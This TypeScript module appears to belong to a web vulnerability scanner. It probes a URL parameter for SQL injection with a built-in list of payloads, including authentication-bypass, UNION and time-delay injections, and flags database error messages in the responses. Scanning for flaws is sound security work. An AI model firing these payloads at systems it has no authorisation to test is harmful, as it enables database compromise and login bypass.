import { buildPayloadTarget, PayloadFormat } from "../payloads";

export interface ScannerFinding {
  type: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | "INFO";
  url: string;
  parameter?: string;
  evidence?: string;
  cvssScore: number;
  cveId?: string;
  confidence?: number;
  validationSteps?: string[];
  isVerified?: boolean;
}

const SQL_ERROR_PATTERNS = [
  /SQL syntax.*MySQL/i, /Warning.*mysql_/i, /MySQLSyntaxErrorException/i,
  /PostgreSQL.*ERROR/i, /PSQLException/i, /ORA-\d{4,}/i,
  /Microsoft OLE DB.*SQL Server/i, /Unclosed quotation mark/i,
  /SQLiteException/i, /You have an error in your SQL syntax/i,
  /ODBC SQL Server Driver/i, /Syntax error.*in query expression/i,
  /pg_query|pg_exec|sqlite_query|mssql_query/i,
  /SQLITE_ERROR/i, /SequelizeDatabaseError/i, /near \".*\": syntax error/i,
];

const SQLI_PAYLOADS = [
  "'",
  "\"",
  "'--",
  "\"--",
  "' OR '1'='1",
  "\" OR \"1\"=\"1",
  "' OR '1'='1'--",
  "1 OR 1=1",
  "1' AND 1=1--",
  "1\" AND 1=1--",
  "' UNION SELECT NULL--",
  "\" UNION SELECT NULL--",
  "admin'--",
  "admin\"--",
  "'; WAITFOR DELAY '0:0:3'--",
  "'; SELECT pg_sleep(3)--",
];

export async function probeSQLiMultiFormat(
  targetUrl: string,
  paramName: string,
  format: PayloadFormat = "URL_PARAM",
  fields: string[] = [paramName],
  authedFetch: (url: string, init?: RequestInit) => Promise<Response | null>
): Promise<ScannerFinding | null> {
  for (const payload of SQLI_PAYLOADS) {
    try {
      const { fetchUrl, options } = buildPayloadTarget(targetUrl, format === "URL_PARAM" ? "GET" : "POST", paramName, payload, format, fields);
      const resp = await authedFetch(fetchUrl, options);
      if (!resp) continue;
      const text = await resp.text();

      if (SQL_ERROR_PATTERNS.some(pat => pat.test(text))) {
        // Multi-payload verification
        const confirmPayload = payload.includes("UNION") ? "'--" : "' OR '1'='1";
        const confirm = buildPayloadTarget(targetUrl, format === "URL_PARAM" ? "GET" : "POST", paramName, confirmPayload, format, fields);
        const confirmResp = await authedFetch(confirm.fetchUrl, confirm.options);
        const confirmText = confirmResp ? await confirmResp.text() : "";
        const isConfirmed = SQL_ERROR_PATTERNS.some(pat => pat.test(confirmText));

        return {
          type: "sqli",
          severity: "CRITICAL",
          url: targetUrl,
          parameter: paramName,
          evidence: `Database SQL error triggered via ${format} payload '${payload}' on parameter '${paramName}'.`,
          cvssScore: 9.8,
          cveId: "CWE-89",
          confidence: isConfirmed ? 0.98 : 0.85,
          validationSteps: [
            `Sent primary payload '${payload}' via ${format} to parameter '${paramName}'`,
            isConfirmed ? `Confirmed SQL signature with secondary payload '${confirmPayload}'` : "Single payload matched database error signature",
          ],
          isVerified: isConfirmed,
        };
      }
    } catch {}
  }
  return null;
}
